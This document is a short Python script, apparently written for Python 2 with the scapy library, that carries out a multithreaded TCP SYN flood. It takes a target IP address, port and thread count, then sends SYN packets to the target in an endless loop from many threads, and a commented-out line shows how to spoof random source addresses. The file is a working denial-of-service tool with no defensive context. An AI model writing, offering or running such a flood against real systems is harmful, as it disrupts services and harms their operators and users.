import sys
import threading
from scapy.all import *
import random
import signal
import time

thread_limit = 200
total        = 0

class SynFlood(threading.Thread):
    def __init__(self, target, port):
        threading.Thread.__init__(self)
        self.target = target
        self.port = port

    def build_syn_packet(self):
        ip = IP()
        # ip.src = "%d.%d.%d.%d" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))
        ip.src="192.168.65.128"
        ip.dst =self.target
 
        tcp = TCP()
        tcp.sport = random.randint(1,65535)
        tcp.dport = self.port
        tcp.flags = 'S'
        return ip/tcp

    def run(self):
        global total
        syn_packet = self.build_syn_packet()
        while True:
            send(syn_packet,verbose=0)
            total += 1


def handler(signum, frame):
    print "exit"
    # with open("a.txt","w") as f:
    #     f.write(total)
    print total
    sys.exit()

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print "example:%s 127.0.0.1 8080 20" % sys.argv[0]

    target = sys.argv[1]
    port = int(sys.argv[2])
    concurrent = int(sys.argv[3])
    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)
    threads = []
    for _ in range(0,concurrent):
        t = SynFlood(target,port)
        t.setDaemon(True)
        threads.append(t)
        t.start()
    # for _ in range(0,concurrent):
    #     t.join()
    while True:
        time.sleep(1)
